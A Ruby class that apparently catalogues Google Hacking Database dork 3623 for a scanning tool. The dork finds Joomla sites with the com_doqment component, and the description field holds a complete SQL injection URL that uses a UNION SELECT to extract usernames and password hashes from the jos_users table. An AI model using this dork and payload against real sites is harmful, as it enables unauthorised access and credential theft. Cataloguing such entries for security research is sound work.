module Dorks
   class Dork3623 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3623",
            ghdb_url: "https://www.exploit-db.com/ghdb/3623",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-11-25",
            author: "anonymous",
            dork: <<~EDORK,
inurl:index.php?option=com_doqment&cid=
EDORK
            description: <<~EDESC
Author: KedAns-Dz http://server/index.php?option=com_doqment&cid=-11/**/union/**/select/**/1,2,concat(username,0x3a,password),4,5,6,7,8/**/from/**/jos_users--
EDESC
         })

      end
   end
end
